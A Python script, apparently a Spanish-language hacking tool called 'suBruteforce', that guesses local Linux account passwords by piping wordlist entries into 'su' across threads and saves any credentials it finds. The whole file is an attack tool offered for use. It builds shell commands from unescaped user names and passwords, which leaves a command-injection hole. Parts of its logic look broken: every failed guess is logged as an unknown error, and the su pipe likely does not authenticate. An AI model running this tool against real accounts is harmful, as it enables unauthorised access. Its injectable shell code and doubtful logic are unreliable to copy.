#!/bin/python3

import argparse
import os
import threading
import sys
import signal
from colorama import init, Fore, Style

# Inicializar colorama para Windows
init()

# Logo ASCII art de suBruteforce
LOGO = """
 ____       _             ____       _             
/ ___|  ___| |_ _   _ ___|  _ \ ___ (_)_ __   __ _ 
\___ \ / _ \ __| | | / __| |_) / _ \| | '_ \ / _` |
 ___) |  __/ |_| |_| \__ \  __/ (_) | | | | | (_| |
|____/ \___|\__|\__,_|___/_|   \___/|_|_| |_|\__, |
                                            |___/ 
"""

# Función para verificar si se está ejecutando como root
def verificar_root():
    return os.geteuid() == 0

# Función para verificar si un usuario existe en el sistema
def verificar_usuario(usuario):
    # Comando para verificar si el usuario existe
    cmd = f"id {usuario}"

    # Ejecutar el comando y obtener el resultado
    resultado = os.system(cmd)

    # 0 significa que el usuario existe, cualquier otro valor significa que no existe
    return resultado == 0

# Función para probar contraseña para un usuario dado
def probar_contrasena(usuario, contrasena):
    # Construir el comando 'su usuario' con la contraseña
    cmd = f"echo \"{contrasena}\" | su {usuario} -c 'sudo -S id > /dev/null 2>&1; echo $?'"

    # Ejecutar el comando y obtener el resultado
    resultado = os.system(cmd)

    # Verificar si la contraseña fue correcta
    if resultado == 0:
        return True
    elif resultado == 1:
        return False
    else:
        return False

# Función para manejar la fuerza bruta para un usuario
def fuerza_bruta(usuario, contrasenas, resultados, success_continue):
    if not verificar_usuario(usuario):
        mensaje = f"[-] El usuario '{usuario}' no existe en el sistema."
        print(Fore.RED + mensaje + Style.RESET_ALL)
        resultados.append(mensaje)
        return
    
    for contrasena in contrasenas:
        if probar_contrasena(usuario, contrasena.strip()):
            mensaje = f"[+] Contraseña encontrada para '{usuario}': {contrasena.strip()}"
            print(Fore.GREEN + mensaje + Style.RESET_ALL)
            resultados.append(mensaje)
            if not success_continue:
                break  # Detener la búsqueda una vez que se encuentra una contraseña válida
        else:
            mensaje = f"[-] Error desconocido al intentar con '{usuario}:{contrasena.strip()}'"
            print(Fore.RED + mensaje + Style.RESET_ALL)
            resultados.append(mensaje)

# Función para manejar la señal SIGINT (Ctrl+C)
def signal_handler(sig, frame):
    print("\n[+] Saliendo...")
    sys.exit(0)

# Función principal del programa
def main():
    # Registrar la señal SIGINT (Ctrl+C) para manejarla correctamente
    signal.signal(signal.SIGINT, signal_handler)

    # Verificar si se está ejecutando como root y salir si es así
    if verificar_root():
        print(Fore.RED + "[-] Este script no debe ejecutarse como root." + Style.RESET_ALL)
        sys.exit(1)

    # Imprimir el logo al inicio
    print(LOGO)
    print("Bienvenido a suBruteforce - Herramienta de Fuerza Bruta para su\n")

    parser = argparse.ArgumentParser(description='Herramienta de fuerza bruta para su con estética bonita.')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-w', '--diccionario', type=str, help='Archivo de diccionario de contraseñas')
    group.add_argument('-p', '--contrasena', type=str, help='Contraseña única a probar junto con el usuario')
    parser.add_argument('-u', '--usuario', type=str, help='Usuario objetivo')
    parser.add_argument('-U', '--usuarios', type=str, help='Archivo de diccionario de usuarios')
    parser.add_argument('-t', '--hilos', type=int, default=1, help='Número de hilos para procesamiento')
    parser.add_argument('-f', '--archivo', type=str, help='Archivo para exportar resultados')
    parser.add_argument('--success-continue', action='store_true', help='Continuar la fuerza bruta después de encontrar la contraseña')

    args = parser.parse_args()

    diccionario = args.diccionario
    contrasena_unica = args.contrasena
    usuario = args.usuario
    usuarios = args.usuarios
    hilos = args.hilos
    archivo_resultados = args.archivo
    success_continue = args.success_continue

    # Verificar que se haya proporcionado solo una opción entre -p y -w
    if contrasena_unica and diccionario:
        print(Fore.RED + "[-] Se debe proporcionar solo una opción entre -p y -w." + Style.RESET_ALL)
        sys.exit(1)

    # Verificar que se haya proporcionado solo una opción entre -u y -U
    if usuario and usuarios:
        print(Fore.RED + "[-] Se debe proporcionar solo una opción entre -u y -U." + Style.RESET_ALL)
        sys.exit(1)

    # Establecer la lista de usuarios según el argumento proporcionado
    if usuarios:
        # Leer el archivo de usuarios
        with open(usuarios, 'r') as f:
            lista_usuarios = f.readlines()
        
        # Eliminar espacios en blanco alrededor de cada usuario
        lista_usuarios = [usuario.strip() for usuario in lista_usuarios]
    elif usuario:
        lista_usuarios = [usuario]
    else:
        print(Fore.RED + "[-] Se debe proporcionar una opción entre -u y -U." + Style.RESET_ALL)
        sys.exit(1)

    # Establecer la lista de contraseñas según el argumento proporcionado
    if contrasena_unica:
        contrasenas = [contrasena_unica]
    else:
        # Leer el diccionario de contraseñas
        with open(diccionario, 'r') as f:
            contrasenas = f.readlines()

    resultados = []

    # Ejecutar la fuerza bruta en paralelo si se especifica más de un hilo
    if hilos > 1:
        threads = []
        for usuario in lista_usuarios:
            for i in range(hilos):
                thread = threading.Thread(target=fuerza_bruta, args=(usuario, contrasenas[i::hilos], resultados, success_continue))
                threads.append(thread)
                thread.start()

        # Esperar a que todos los hilos terminen
        for thread in threads:
            thread.join()
    else:
        # Ejecutar en un solo hilo
        for usuario in lista_usuarios:
            fuerza_bruta(usuario, contrasenas, resultados, success_continue)

    # Exportar resultados si se especifica un archivo
    if archivo_resultados:
        with open(archivo_resultados, 'w') as file:
            file.write(LOGO + "\n")  # Añadir el logo al inicio del archivo
            file.write(f"Resultados de fuerza bruta:\n")
            for resultado in resultados:
                if resultado.startswith("[+]"):
                    file.write(resultado + '\n')
            print(Fore.GREEN + f"[+] Resultados exportados correctamente a '{archivo_resultados}'." + Style.RESET_ALL)

if __name__ == '__main__':
    main()
